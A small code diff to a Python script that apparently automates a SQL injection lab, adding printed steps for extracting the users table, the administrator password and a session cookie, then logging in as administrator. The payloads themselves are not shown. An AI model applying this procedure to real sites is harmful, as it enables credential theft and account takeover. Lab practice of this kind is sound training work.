@@ -2,6 +2,7 @@ import requests
 import urllib3 
 from bs4 import BeautifulSoup
 import re
+from colorama import Fore
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -37,6 +38,9 @@ def sqli_admin_cred(url, table, user_col, pass_col, proxies):
         return None
 
 def run(url, payload=None, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Inject payload into 'category' query parameter to retrieve the name of users table\n2. Adjust the payload to retrieve the names of username and password columns\n3. Adjust the payload to retrieve the administrator password\n4. Fetch the login page\n5. Extract the csrf token and session cookie\n6. Login as the administrator\n7. Fetch the administrator profile\n""")
+
     print("[*] Looking for users table...")
     users_table = sqli_users_table(url, proxies)
     if not users_table:
